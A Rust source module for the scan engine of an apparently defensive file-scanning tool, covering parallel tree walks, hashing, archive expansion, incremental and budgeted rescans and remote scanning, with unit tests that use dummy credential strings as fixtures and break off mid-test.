//! The scan engine: walk a tree in parallel, read each regular file once,
//! hash it (blake3), run the scanner registry over its bytes, stream matches
//! as they are found, then upsert the results into the store and commit a
//! scan record.
//!
//! Rescans are incremental: a stat fast-path (size + mtime against the stored
//! file index) skips re-reading unchanged files, and re-scanned files have
//! their findings replaced, not duplicated.
//!
//! # Rust notes
//!
//! This crate mixes two concurrency worlds, which is common in real programs:
//!
//! - The **walk** is thread-based: the `ignore` crate spins up OS threads that
//!   each visit directory entries. Threads communicate via an **mpsc channel**
//!   (multi-producer, single-consumer): every worker gets a clone of the
//!   sender `tx`, and this function drains the receiver `rx`. Dropping the
//!   last sender closes the channel, which is what ends the `while rx.recv()`
//!   loop — no explicit "done" signal needed.
//! - The **database** is async (tokio): persisting results happens with
//!   `.await` after workers finish producing. Nothing here blocks the async
//!   runtime while file I/O happens on the walker's own threads.
//!
//! The `move` keyword on the worker closure transfers ownership of the cloned
//! `tx`/`host` into that closure, so each thread owns its handles outright —
//! the compiler will not let one thread borrow another's locals.

pub mod plan;
pub mod run;
pub mod setup;

pub use plan::{Budget, ScanPlan};

use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::mpsc;
use std::time::{SystemTime, UNIX_EPOCH};

use anyhow::{Context, Result};
use exfil_core::{platform::ownership, FileMeta, Match};
use exfil_store::{FileStat, ScanRecord, Store};
use exfil_task::Pipeline;
use ignore::{WalkBuilder, WalkState};

/// How much of a file's head to inspect for NUL bytes when deciding whether
/// it is binary. Binary content still gets a file record either way; only
/// `binary_safe` tasks (YARA, ClamAV signature matching) run on it — text
/// scanners (regex, PII, IOC…) would just match compression/binary noise.
const BINARY_SNIFF_LEN: usize = 8192;

/// How deep archive-within-archive expansion recurses before stopping. Bounds
/// work on hostile nested archives (a zip inside a zip inside a zip…).
const MAX_EXPAND_DEPTH: u32 = 8;

/// Largest file whose *content* is scanned. Scanning requires the whole file in
/// memory and the walk is parallel, so this bounds peak memory at roughly
/// `threads × MAX_SCAN_BYTES` instead of `threads × largest-file-in-the-tree`.
/// Files above it are still stat'ed, hashed, and recorded — they just aren't
/// read into memory or handed to the pipeline.
const MAX_SCAN_BYTES: u64 = 512 * 1024 * 1024;

/// Chunk size for [`hash_file_streaming`]; large enough to keep syscall
/// overhead negligible, small enough to stay off the stack and out of the way.
const HASH_CHUNK: usize = 1024 * 1024;

/// Result of one scan run.
#[derive(Debug, Default, Clone)]
pub struct Summary {
    /// Regular files recorded (including unchanged ones).
    pub files: u64,
    /// Matches found in files that were (re)scanned this run. Findings on
    /// unchanged files are already in the store and are not re-counted.
    pub matches: u64,
    /// Files skipped by the stat fast-path: same size and mtime as the last
    /// scan, so their stored records and findings were reused unread.
    pub unchanged: u64,
    /// Files that could not be read (permission, races); they are skipped.
    pub errors: u64,
    /// Files a [`Budget`](plan::Budget) stopped the scan before reaching.
    ///
    /// Non-zero means **this scan did not look at everything** — the caller
    /// must say so rather than letting a partial run read as a clean one.
    pub skipped: u64,
    /// Candidate files the walk found, whether or not they were examined.
    /// Equals `files + skipped` for a ranked scan.
    pub candidates: u64,
    /// The ruleset changed since the last scan, so the stat fast-path was
    /// bypassed and every file was re-examined under the new rules.
    pub ruleset_changed: bool,
}

impl Summary {
    /// Whether a budget stopped this scan short of the whole tree.
    pub fn is_partial(&self) -> bool {
        self.skipped > 0
    }

    /// Fraction of candidate files actually examined, in `0.0..=1.0`.
    pub fn coverage(&self) -> f64 {
        if self.candidates == 0 {
            return 1.0;
        }
        (self.candidates - self.skipped) as f64 / self.candidates as f64
    }
}

/// One processed file: its metadata, any matches, an optional parsed AST, and —
/// for files expanded from an archive — the content hash of the container.
struct FileResult {
    meta: FileMeta,
    matches: Vec<Match>,
    /// The parsed AST, when a language task produced one (for `has_ast`).
    ast: Option<exfil_task::Ast>,
    /// Observables extracted from the file (for `has_indicators`).
    indicators: Option<exfil_task::Indicators>,
    /// `Some(container_hash)` when this file was expanded from an archive.
    contained_in: Option<String>,
}

/// What a walker thread concluded about one on-disk file. A single archive
/// yields several results: the archive itself plus every file expanded from it.
enum WalkOutcome {
    /// Read, hashed, and scanned; the container plus any expanded descendants.
    Scanned(Vec<FileResult>),
    /// Stat fast-path hit: size+mtime match the stored record, so the file
    /// was not read. The stored hash keeps it in this scan's `includes`.
    Unchanged { hash: String },
    /// The file could not be stat'ed or read.
    Error,
}

/// Live progress events emitted while a scan runs.
///
/// The engine never prints; it reports through this channel and the caller
/// decides how to render (plain lines, a ratatui gauge, nothing). Pass `None`
/// to [`scan`] to skip event reporting entirely.
#[derive(Debug, Clone)]
pub enum ScanEvent {
    /// Total number of regular files the walk will visit (sent once, first).
    Total(u64),
    /// A match was found (streamed as it happens).
    Match(Match),
    /// One file finished processing (a progress tick).
    FileDone,
}

/// Configure the walk shared by [`scan`] and its pre-count: gitignore-aware,
/// includes dotfiles, and skips `.git`, `.exfil`, and the store directory
/// itself (`skip`, compared by canonical path so any `--store` location is
/// excluded even when it sits inside the scanned tree).
fn walk_builder(root: &Path, skip: Option<&Path>) -> WalkBuilder {
    let skip = skip.and_then(|p| std::fs::canonicalize(p).ok());
    let mut builder = WalkBuilder::new(root);
    builder
        .hidden(false) // scan dotfiles; .gitignore is still honored
        .filter_entry(move |e| {
            if e.file_name() == ".exfil" || e.file_name() == ".git" {
                return false;
            }
            match (&skip, e.file_type()) {
                (Some(skip), Some(ft)) if ft.is_dir() => {
                    std::fs::canonicalize(e.path()).ok().as_deref() != Some(skip)
                }
                _ => true,
            }
        });
    builder
}

/// Count the regular files a scan of `root` will visit, using the same walk
/// filters as the scan itself. Cheap (stat-only) pre-pass for progress totals.
fn count_files(root: &Path, skip: Option<&Path>) -> u64 {
    walk_builder(root, skip)
        .build()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_some_and(|ft| ft.is_file()))
        .count() as u64
}

/// Walk `root` in parallel, run the task `pipeline` over every regular file,
/// and persist files, findings, and the scan record into `store`. Progress and
/// matches stream over `events` when a sender is provided. `skip_dir` names
/// a directory to exclude from the walk (the store itself).
pub async fn scan(
    root: &Path,
    pipeline: &Pipeline,
    store: &Store,
    skip_dir: Option<&Path>,
    events: Option<mpsc::Sender<ScanEvent>>,
) -> Result<Summary> {
    scan_with_plan(
        root,
        pipeline,
        store,
        skip_dir,
        events,
        &ScanPlan::default(),
    )
    .await
}

/// Walk `root` under a [`ScanPlan`]: rank candidates worst-first with the
/// plan's model, and stop when its budget is spent.
///
/// A plan with neither a model nor a budget falls through to the plain
/// streaming walk, which is both simpler and faster — there is nothing to
/// order and nothing to stop.
pub async fn scan_with_plan(
    root: &Path,
    pipeline: &Pipeline,
    store: &Store,
    skip_dir: Option<&Path>,
    events: Option<mpsc::Sender<ScanEvent>>,
    plan: &ScanPlan,
) -> Result<Summary> {
    if plan.is_ranked() {
        return scan_ranked(root, pipeline, store, skip_dir, events, plan).await;
    }
    scan_streaming(root, pipeline, store, skip_dir, events, plan).await
}

/// The original streaming walk: process every file as the walker reaches it.
async fn scan_streaming(
    root: &Path,
    pipeline: &Pipeline,
    store: &Store,
    skip_dir: Option<&Path>,
    events: Option<mpsc::Sender<ScanEvent>>,
    plan: &ScanPlan,
) -> Result<Summary> {
    if let Some(ev) = &events {
        let _ = ev.send(ScanEvent::Total(count_files(root, skip_dir)));
    }
    let (index, ruleset_changed) = stat_index(store, plan).await;
    let host = gethostname::gethostname().to_string_lossy().into_owned();
    let started_at = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_millis() as u64)
        .unwrap_or(0);

    // Parallel walk: worker threads read/hash/scan and send results over a
    // channel; progress events stream immediately from the workers.
    let (tx, rx) = mpsc::channel::<WalkOutcome>();
    let walker = walk_builder(root, skip_dir).build_parallel();

    walker.run(|| {
        let tx = tx.clone();
        let host = host.clone();
        let pipeline = &pipeline;
        let events = events.clone();
        let index = index.clone();
        Box::new(move |entry| {
            // `let-else`: unwrap the happy case or bail out of this closure.
            // `let _ =` deliberately ignores a Result we can't act on (if the
            // receiver hung up, this thread has nothing better to do anyway).
            let Ok(entry) = entry else {
                let _ = tx.send(WalkOutcome::Error);
                return WalkState::Continue;
            };
            let Some(ft) = entry.file_type() else {
                return WalkState::Continue;
            };
            if !ft.is_file() {
                return WalkState::Continue;
            }
            let outcome = match process_file(entry.path(), &host, pipeline, &index) {
                Ok(outcome) => outcome,
                Err(_) => WalkOutcome::Error,
            };
            if let Some(ev) = &events {
                if let WalkOutcome::Scanned(results) = &outcome {
                    for res in results {
                        for m in &res.matches {
                            let _ = ev.send(ScanEvent::Match(m.clone()));
                        }
                    }
                }
                if !matches!(outcome, WalkOutcome::Error) {
                    let _ = ev.send(ScanEvent::FileDone);
                }
            }
            let _ = tx.send(outcome);
            WalkState::Continue
        })
    });
    drop(tx);

    // Persist as results arrive (the walk has finished threads once the
    // channel drains; recv() on a std channel is fine to call here because the
    // senders live on rayon-style walker threads, not this async task).
    let mut summary = Summary {
        ruleset_changed,
        ..Summary::default()
    };
    let mut hashes = Vec::new();
    while let Ok(res) = rx.recv() {
        persist_outcome(store, res, &mut summary, &mut hashes).await?;
    }
    summary.candidates = summary.files;

    store
        .commit_scan(
            &ScanRecord {
                root: root.display().to_string(),
                host,
                started_at,
                files: summary.files,
                matches: summary.matches,
                ruleset: plan.ruleset.clone(),
            },
            &hashes,
        )
        .await?;
    Ok(summary)
}

/// The stat cache to scan against — unless the ruleset moved since the last
/// scan, in which case there isn't one.
///
/// The fast-path's promise is "this file is unchanged, so its stored findings
/// still stand". That promise is only true for the rules that produced them:
/// pull a new dataset and every unchanged file becomes a file those rules have
/// never seen. Returning an empty index makes the next scan re-examine
/// everything exactly once, after which the recorded fingerprint matches again.
async fn stat_index(
    store: &Store,
    plan: &ScanPlan,
) -> (std::sync::Arc<HashMap<String, FileStat>>, bool) {
    let changed = if plan.ruleset.is_empty() {
        false // caller didn't say; don't invalidate on a guess
    } else {
        match store.last_ruleset().await {
            Ok(Some(prev)) => prev != plan.ruleset,
            Ok(None) => false, // nothing recorded yet, so nothing to contradict
            // A store that cannot answer must not be assumed to agree: skipping
            // files is a claim we can no longer support, so re-examine instead.
            Err(e) => {
                eprintln!("warning: could not read the last scan's ruleset ({e:#}); re-scanning everything");
                true
            }
        }
    };
    if changed {
        return (std::sync::Arc::new(HashMap::new()), true);
    }
    (
        std::sync::Arc::new(store.file_index().await.unwrap_or_default()),
        false,
    )
}

/// One file the walk found, with everything needed to decide whether it is
/// worth opening.
struct Candidate {
    path: PathBuf,
    size: u64,
    /// Whether the stat fast-path says this file changed since the last scan.
    changed: bool,
    /// Model value: probability of a finding per unit of work.
    value: f64,
    /// The model's `P(finding)` for this path, kept separately from `value`
    /// because a confidence budget sums probabilities, not value-per-byte.
    score: f64,
}

/// Ranked, budgeted scan: enumerate and score first, then scan in value order
/// until the budget is spent.
///
/// The enumeration pass replaces `count_files` rather than adding to it — the
/// progress total falls out of the same traversal that produces the ranking, so
/// ranking costs no extra walk.
async fn scan_ranked(
    root: &Path,
    pipeline: &Pipeline,
    store: &Store,
    skip_dir: Option<&Path>,
    events: Option<mpsc::Sender<ScanEvent>>,
    plan: &ScanPlan,
) -> Result<Summary> {
    let (index, ruleset_changed) = stat_index(store, plan).await;
    let host = gethostname::gethostname().to_string_lossy().into_owned();
    let started_at = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_millis() as u64)
        .unwrap_or(0);

    // ── Phase 1: enumerate and score (stat only, no reads) ──────────────────
    let mut candidates: Vec<Candidate> = walk_builder(root, skip_dir)
        .build()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_some_and(|ft| ft.is_file()))
        .map(|e| {
            let path = e.path().to_path_buf();
            let md = e.metadata().ok();
            let size = md.as_ref().map(|m| m.len()).unwrap_or(0);
            let changed = is_changed(&path, md.as_ref(), &index);
            let score = plan
                .model
                .as_ref()
                .map(|m| m.score(&path.display().to_string()))
                .unwrap_or(0.5);
            Candidate {
                path,
                size,
                changed,
                value: plan::value(score, size),
                score,
            }
        })
        .collect();

    // Changed files outrank everything: only they can produce *new* findings,
    // and the stat index knows which they are with certainty. No prior beats a
    // fact. Within each group, order by model value, then by path so an equal
    // score never depends on directory iteration order.
    candidates.sort_by(|a, b| {
        b.changed
            .cmp(&a.changed)
            .then_with(|| {
                b.value
                    .partial_cmp(&a.value)
                    .unwrap_or(std::cmp::Ordering::Equal)
            })
            .then_with(|| a.path.cmp(&b.path))
    });

    let total = candidates.len() as u64;
    if let Some(ev) = &events {
        let _ = ev.send(ScanEvent::Total(total));
    }

    // A file-count budget can be applied up front; time and byte budgets can
    // only be enforced as the scan runs.
    let limit = match plan.budget {
        // Confidence needs the ranked scores, so it resolves here rather than
        // from a count: take candidates until they account for the requested
        // share of the total expected findings.
        Some(plan::Budget::Confidence(c)) => {
            let scores: Vec<f64> = candidates.iter().map(|c| c.score).collect();
            plan::confidence_limit(&scores, c)
        }
        other => other
            .and_then(|b| b.file_limit(total))
            .map(|n| n.min(total) as usize)
            .unwrap_or(candidates.len()),
    };

    // ── Phase 2: scan in order until the budget is spent ────────────────────
    let (tx, rx) = mpsc::channel::<WalkOutcome>();
    let cursor = std::sync::atomic::AtomicUsize::new(0);
    let bytes_read = std::sync::atomic::AtomicU64::new(0);
    let stop = std::sync::atomic::AtomicBool::new(false);
    let started = std::time::Instant::now();
    let workers = std::thread::available_parallelism()
        .map(|n| n.get())
        .unwrap_or(4);

    std::thread::scope(|scope| {
        for _ in 0..workers {
            let tx = tx.clone();
            let host = host.clone();
            let index = index.clone();
            let events = events.clone();
            let candidates = &candidates;
            let cursor = &cursor;
            let bytes_read = &bytes_read;
            let stop = &stop;
            let budget = plan.budget;
            scope.spawn(move || {
                use std::sync::atomic::Ordering::Relaxed;
                loop {
                    if stop.load(Relaxed) {
                        break;
                    }
                    let i = cursor.fetch_add(1, Relaxed);
                    if i >= limit {
                        break;
                    }
                    let cand = &candidates[i];

                    // Enforce the budgets that can only be known mid-run. The
                    // check is before the work, so the budget is a ceiling on
                    // what is *started*, never exceeded by a late arrival.
                    match budget {
                        Some(plan::Budget::Time(limit)) if started.elapsed() >= limit => {
                            stop.store(true, Relaxed);
                            break;
                        }
                        Some(plan::Budget::Bytes(cap))
                            if bytes_read.fetch_add(cand.size, Relaxed) + cand.size > cap =>
                        {
                            stop.store(true, Relaxed);
                            break;
                        }
                        _ => {}
                    }

                    let outcome = match process_file(&cand.path, &host, pipeline, &index) {
                        Ok(outcome) => outcome,
                        Err(_) => WalkOutcome::Error,
                    };
                    if let Some(ev) = &events {
                        if let WalkOutcome::Scanned(results) = &outcome {
                            for res in results {
                                for m in &res.matches {
                                    let _ = ev.send(ScanEvent::Match(m.clone()));
                                }
                            }
                        }
                        if !matches!(outcome, WalkOutcome::Error) {
                            let _ = ev.send(ScanEvent::FileDone);
                        }
                    }
                    let _ = tx.send(outcome);
                }
            });
        }
        drop(tx);
    });

    let mut summary = Summary {
        candidates: total,
        ruleset_changed,
        ..Summary::default()
    };
    let mut hashes = Vec::new();
    let mut attempted = 0u64;
    while let Ok(res) = rx.recv() {
        attempted += 1;
        persist_outcome(store, res, &mut summary, &mut hashes).await?;
    }
    summary.skipped = total.saturating_sub(attempted);

    store
        .commit_scan(
            &ScanRecord {
                root: root.display().to_string(),
                host,
                started_at,
                files: summary.files,
                matches: summary.matches,
                ruleset: plan.ruleset.clone(),
            },
            &hashes,
        )
        .await?;
    Ok(summary)
}

/// Whether a file differs from what the last scan recorded, by the same
/// size+mtime test the streaming walk uses. A file the store has never seen
/// counts as changed.
fn is_changed(
    path: &Path,
    md: Option<&std::fs::Metadata>,
    index: &HashMap<String, FileStat>,
) -> bool {
    let Some(md) = md else {
        return true;
    };
    let mtime = md
        .modified()
        .ok()
        .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
        .map(|d| d.as_secs().to_string())
        .unwrap_or_default();
    if mtime.is_empty() {
        return true;
    }
    let abs = std::fs::canonicalize(path)
        .unwrap_or_else(|_| path.to_path_buf())
        .display()
        .to_string();
    match index.get(&abs) {
        Some(prev) => prev.size != md.len() || prev.mtime != mtime,
        None => true,
    }
}

/// Write one walk outcome into the store, accumulating counters. Shared by the
/// streaming and ranked walks so both persist identically.
async fn persist_outcome(
    store: &Store,
    outcome: WalkOutcome,
    summary: &mut Summary,
    hashes: &mut Vec<String>,
) -> Result<()> {
    match outcome {
        WalkOutcome::Scanned(results) => {
            for fr in results {
                summary.files += 1;
                summary.matches += fr.matches.len() as u64;
                store.upsert_file(&fr.meta).await?;
                // Replace, don't append: stale findings from earlier scans of
                // this content are removed before the fresh ones go in.
                store.clear_findings(&fr.meta.hash).await?;
                for m in &fr.matches {
                    store.add_finding(m, &fr.meta.hash).await?;
                }
                if let Some(ast) = &fr.ast {
                    if !ast.symbols.is_empty() {
                        let symbols = serde_json::to_value(&ast.symbols).unwrap_or_default();
                        store.upsert_ast(&fr.meta.hash, &ast.lang, &symbols).await?;
                    }
                }
                if let Some(ind) = &fr.indicators {
                    if !ind.is_empty() {
                        let value = serde_json::to_value(ind).unwrap_or_default();
                        store.upsert_indicators(&fr.meta.hash, &value).await?;
                    }
                }
                if let Some(container) = &fr.contained_in {
                    store.relate_contained_in(&fr.meta.hash, container).await?;
                }
                hashes.push(fr.meta.hash);
            }
        }
        WalkOutcome::Unchanged { hash } => {
            summary.files += 1;
            summary.unchanged += 1;
            hashes.push(hash);
        }
        WalkOutcome::Error => summary.errors += 1,
    }
    Ok(())
}

/// A remote filesystem the engine can scan: enumerate files under a root and
/// read their bytes. Implemented over SSH/SFTP (see the `exfil-remote` crate)
/// or in memory for tests. This is how a scanner runs against another host —
/// the scanners never know the bytes came from the network.
#[async_trait::async_trait]
pub trait RemoteFs: Send + Sync {
    /// The host these files live on (stored on every file record).
    fn host(&self) -> &str;

    /// List the regular files under `root` (recursively), as remote paths.
    async fn list(&self, root: &str) -> Result<Vec<String>>;

    /// Read one remote file's bytes.
    async fn read(&self, path: &str) -> Result<Vec<u8>>;
}

/// Scan a remote host's files with `pipeline`, persisting file and finding
/// records (tagged with the remote host) into `store`. Archives expand and all
/// scanners run exactly as for a local scan; there is no incremental fast-path
/// (every remote file is read). Files that fail to read are counted, not fatal.
pub async fn scan_remote(
    fs: &dyn RemoteFs,
    root: &str,
    pipeline: &Pipeline,
    store: &Store,
    events: Option<mpsc::Sender<ScanEvent>>,
) -> Result<Summary> {
    let host = fs.host().to_string();
    let started_at = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_millis() as u64)
        .unwrap_or(0);

    let paths = fs.list(root).await.context("list remote files")?;
    if let Some(ev) = &events {
        let _ = ev.send(ScanEvent::Total(paths.len() as u64));
    }

    let mut summary = Summary::default();
    let mut hashes = Vec::new();
    for path in paths {
        let content = match fs.read(&path).await {
            Ok(c) => c,
            Err(_) => {
                summary.errors += 1;
                continue;
            }
        };
        let hash = blake3::hash(&content).to_hex().to_string();
        let meta = FileMeta {
            path: path.clone(),
            abs: format!("{host}:{path}"),
            host: host.clone(),
            mode: 0,
            uid: 0,
            gid: 0,
            user: String::new(),
            group: String::new(),
            size: content.len() as u64,
            mtime: String::new(),
            hash: hash.clone(),
        };

        let mut results = Vec::new();
        // Same [`MAX_SCAN_BYTES`] rule as the local walk, so a file's treatment
        // doesn't depend on which side of the network it sits on. Note the cap
        // can only be applied *after* the read here: `RemoteFs` hands back a
        // whole `Vec<u8>` with no stat to size it up front, so this bounds the
        // scanning work but not the allocation. It is the weaker of the two
        // guards, and mitigated by this loop being sequential — peak memory is
        // one file, not one per walker thread.
        let processed = if content.len() as u64 > MAX_SCAN_BYTES {
            Processed::default()
        } else {
            run_pipeline(Path::new(&path), content, pipeline)
        };
        results.push(FileResult {
            meta,
            matches: processed.matches,
            ast: processed.ast,
            indicators: processed.indicators,
            contained_in: None,
        });
        expand_into(&hash, processed.expanded, &host, pipeline, 1, &mut results);

        for fr in results {
            summary.files += 1;
            summary.matches += fr.matches.len() as u64;
            if let Some(ev) = &events {
                for m in &fr.matches {
                    let _ = ev.send(ScanEvent::Match(m.clone()));
                }
            }
            store.upsert_file(&fr.meta).await?;
            store.clear_findings(&fr.meta.hash).await?;
            for m in &fr.matches {
                store.add_finding(m, &fr.meta.hash).await?;
            }
            if let Some(ast) = &fr.ast {
                if !ast.symbols.is_empty() {
                    let symbols = serde_json::to_value(&ast.symbols).unwrap_or_default();
                    store.upsert_ast(&fr.meta.hash, &ast.lang, &symbols).await?;
                }
            }
            if let Some(ind) = &fr.indicators {
                if !ind.is_empty() {
                    let value = serde_json::to_value(ind).unwrap_or_default();
                    store.upsert_indicators(&fr.meta.hash, &value).await?;
                }
            }
            if let Some(container) = &fr.contained_in {
                store.relate_contained_in(&fr.meta.hash, container).await?;
            }
            hashes.push(fr.meta.hash);
        }
        if let Some(ev) = &events {
            let _ = ev.send(ScanEvent::FileDone);
        }
    }

    store
        .commit_scan(
            &ScanRecord {
                root: format!("{host}:{root}"),
                host,
                started_at,
                files: summary.files,
                matches: summary.matches,
                // Remote scans have no stat fast-path to invalidate, so they
                // record no fingerprint.
                ruleset: String::new(),
            },
            &hashes,
        )
        .await?;
    Ok(summary)
}

/// Hash a file in fixed-size chunks, so a file of any size costs one
/// [`HASH_CHUNK`] buffer rather than its own length in memory. Used for files
/// over [`MAX_SCAN_BYTES`], which are recorded but never read whole.
fn hash_file_streaming(path: &Path) -> Result<String> {
    use std::io::Read;

    let mut file = std::fs::File::open(path)?;
    let mut hasher = blake3::Hasher::new();
    let mut buf = vec![0u8; HASH_CHUNK];
    loop {
        let n = file.read(&mut buf)?;
        if n == 0 {
            break;
        }
        hasher.update(&buf[..n]);
    }
    Ok(hasher.finalize().to_hex().to_string())
}

/// Process one regular file: stat it, and either take the fast path (size and
/// mtime match the stored record — reuse it unread) or read, hash, and scan.
fn process_file(
    path: &Path,
    host: &str,
    pipeline: &Pipeline,
    index: &HashMap<String, FileStat>,
) -> Result<WalkOutcome> {
    let md = std::fs::metadata(path).with_context(|| format!("stat {}", path.display()))?;
    let mtime = md
        .modified()
        .ok()
        .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
        .map(|d| d.as_secs().to_string())
        .unwrap_or_default();
    let abs: PathBuf = std::fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf());

    // Stat fast-path: an unchanged file keeps its stored records and findings.
    if let Some(prev) = index.get(&abs.display().to_string()) {
        if prev.size == md.len() && prev.mtime == mtime && !mtime.is_empty() {
            return Ok(WalkOutcome::Unchanged {
                hash: prev.hash.clone(),
            });
        }
    }

    // Scanning needs the whole file in memory, and the walk is parallel, so an
    // unbounded read means N threads can each hold a multi-gigabyte allocation
    // — a VM image or database dump in the tree would take the process down.
    // Past the cap the file is still hashed (streamed, so memory stays bounded)
    // and still recorded, which keeps filesystem coverage complete; only its
    // *content* goes unscanned.
    let oversize = md.len() > MAX_SCAN_BYTES;
    let content = if oversize {
        Vec::new()
    } else {
        std::fs::read(path).with_context(|| format!("read {}", path.display()))?
    };
    let hash = if oversize {
        hash_file_streaming(path).with_context(|| format!("hash {}", path.display()))?
    } else {
        blake3::hash(&content).to_hex().to_string()
    };
    let own = ownership(&md);

    let meta = FileMeta {
        path: path.display().to_string(),
        abs: abs.display().to_string(),
        host: host.to_string(),
        mode: own.mode,
        uid: own.uid,
        gid: own.gid,
        user: own.user,
        group: own.group,
        size: md.len(),
        mtime,
        hash: hash.clone(),
    };

    // The container file plus everything expanded out of it (recursively).
    let mut results = Vec::new();
    let processed = if oversize {
        Processed::default()
    } else {
        run_pipeline(path, content, pipeline)
    };
    results.push(FileResult {
        meta,
        matches: processed.matches,
        ast: processed.ast,
        indicators: processed.indicators,
        contained_in: None,
    });
    expand_into(&hash, processed.expanded, host, pipeline, 1, &mut results);

    Ok(WalkOutcome::Scanned(results))
}

/// What running the pipeline over one file's bytes yielded.
#[derive(Default)]
struct Processed {
    matches: Vec<Match>,
    expanded: Vec<exfil_core::VirtualFile>,
    ast: Option<exfil_task::Ast>,
    indicators: Option<exfil_task::Indicators>,
}

/// Run the pipeline over one file's bytes. Binary content (archives,
/// databases, executables) runs only the binary-safe tasks — the expanders,
/// which turn containers into inner files for re-processing, plus the
/// binary-signature scanners (YARA, ClamAV). Text-pattern scanners are held
/// back from it, since matching regexes against compression artifacts just
/// produces garbage findings. Text content runs everything.
///
/// Container-ness is decided by the content, not the filename: expanders match
/// on extension alone, so a plain text file named `notes.db` expands to nothing
/// and is then scanned as the text it is.
fn run_pipeline(path: &Path, content: Vec<u8>, pipeline: &Pipeline) -> Processed {
    // Binary files get a record (full VFS coverage) either way; only
    // binary-safe tasks run on the content itself.
    let head = &content[..content.len().min(BINARY_SNIFF_LEN)];
    let is_binary = head.contains(&0);
    let result = if is_binary {
        pipeline.run_file_binary_only(path, content)
    } else {
        pipeline.run_file(path, content)
    };
    match result {
        Ok(out) => Processed {
            matches: out.matches,
            expanded: out.expanded,
            ast: out.ast,
            indicators: out.indicators,
        },
        Err(_) => Processed::default(),
    }
}

/// Turn expanded virtual files into [`FileResult`]s, recursing into nested
/// archives up to [`MAX_EXPAND_DEPTH`]. Each result links to its container.
fn expand_into(
    container_hash: &str,
    expanded: Vec<exfil_core::VirtualFile>,
    host: &str,
    pipeline: &Pipeline,
    depth: u32,
    out: &mut Vec<FileResult>,
) {
    if depth > MAX_EXPAND_DEPTH {
        return;
    }
    for vf in expanded {
        let hash = blake3::hash(&vf.content).to_hex().to_string();
        let size = vf.content.len() as u64;
        let vpath = PathBuf::from(&vf.path);
        let processed = run_pipeline(&vpath, vf.content, pipeline);
        out.push(FileResult {
            meta: FileMeta {
                path: vf.path.clone(),
                abs: vf.path,
                host: host.to_string(),
                mode: 0,
                uid: 0,
                gid: 0,
                user: String::new(),
                group: String::new(),
                size,
                mtime: String::new(),
                hash: hash.clone(),
            },
            matches: processed.matches,
            ast: processed.ast,
            indicators: processed.indicators,
            contained_in: Some(container_hash.to_string()),
        });
        expand_into(&hash, processed.expanded, host, pipeline, depth + 1, out);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use exfil_scan::default_pipeline;

    /// A tree of `n` files, half of them carrying a secret, plus a store dir.
    fn ranked_tree(name: &str, n: usize) -> (std::path::PathBuf, std::path::PathBuf) {
        let base = std::env::temp_dir().join(format!("exfil-ranked-{}-{name}", std::process::id()));
        let tree = base.join("tree");
        let _ = std::fs::remove_dir_all(&base);
        std::fs::create_dir_all(tree.join("secrets")).unwrap();
        std::fs::create_dir_all(tree.join("docs")).unwrap();
        for i in 0..n {
            std::fs::write(
                tree.join("secrets").join(format!("k{i}.env")),
                format!("AWS_KEY=AKIA0123456789ABCDE{}\n", i % 10),
            )
            .unwrap();
            // Content must differ per file: `file` records are keyed by
            // content hash, so identical files collapse to one record and the
            // stat index would only know one of their paths.
            std::fs::write(
                tree.join("docs").join(format!("d{i}.md")),
                format!("just some prose, document {i}\n"),
            )
            .unwrap();
        }
        (base.join("store"), tree)
    }

    /// The staleness bug: without a fingerprint, `pull` a new ruleset and
    /// rescan, and every unchanged file keeps its stat fast-path — so the new
    /// rules never see them. The fingerprint is what makes the next scan
    /// distrust "unchanged".
    #[tokio::test(flavor = "multi_thread")]
    async fn a_changed_ruleset_bypasses_the_stat_fast_path() {
        let (store_dir, tree) = ranked_tree("ruleset", 4);
        let pipeline = default_pipeline().unwrap();
        let store = Store::open_findings(&store_dir).await.unwrap();

        let plan_a = ScanPlan {
            ruleset: "ruleset-aaaa".into(),
            ..Default::default()
        };
        let first = scan_with_plan(&tree, &pipeline, &store, Some(&store_dir), None, &plan_a)
            .await
            .unwrap();
        assert_eq!(first.unchanged, 0, "nothing is unchanged on a first scan");
        assert!(!first.ruleset_changed);

        // Same rules, nothing touched: the fast-path does its job.
        let second = scan_with_plan(&tree, &pipeline, &store, Some(&store_dir), None, &plan_a)
            .await
            .unwrap();
        assert_eq!(second.unchanged, second.files, "all files unchanged");
        assert!(!second.ruleset_changed);

        // New ruleset, nothing touched: every file must be re-examined.
        let plan_b = ScanPlan {
            ruleset: "ruleset-bbbb".into(),
            ..Default::default()
        };
        let third = scan_with_plan(&tree, &pipeline, &store, Some(&store_dir), None, &plan_b)
            .await
            .unwrap();
        assert!(third.ruleset_changed, "the ruleset moved");
        assert_eq!(
            third.unchanged, 0,
            "new rules have never seen these files, so none may be skipped"
        );

        // And once re-scanned under the new rules, the fast-path returns.
        let fourth = scan_with_plan(&tree, &pipeline, &store, Some(&store_dir), None, &plan_b)
            .await
            .unwrap();
        assert!(!fourth.ruleset_changed);
        assert_eq!(fourth.unchanged, fourth.files);

        let _ = std::fs::remove_dir_all(store_dir.parent().unwrap());
    }

    /// An empty fingerprint means "the caller didn't say", which must never be
    /// read as a mismatch — otherwise every scan would invalidate everything.
    #[tokio::test(flavor = "multi_thread")]
    async fn an_unknown_fingerprint_never_invalidates() {
        let (store_dir, tree) = ranked_tree("nofp", 3);
        let pipeline = default_pipeline().unwrap();
        let store = Store::open_findings(&store_dir).await.unwrap();

        let known = ScanPlan {
            ruleset: "ruleset-aaaa".into(),
            ..Default::default()
        };
        scan_with_plan(&tree, &pipeline, &store, Some(&store_dir), None, &known)
            .await
            .unwrap();

        let unknown = ScanPlan::default();
        let out = scan_with_plan(&tree, &pipeline, &store, Some(&store_dir), None, &unknown)
            .await
            .unwrap();
        assert!(!out.ruleset_changed);
        assert_eq!(out.unchanged, out.files, "fast-path still applies");

        let _ = std::fs::remove_dir_all(store_dir.parent().unwrap());
    }

    #[tokio::test(flavor = "multi_thread")]
    async fn budget_stops_early_and_reports_partial_coverage() {
        let (store_dir, tree) = ranked_tree("budget", 10);
        let pipeline = default_pipeline().unwrap();
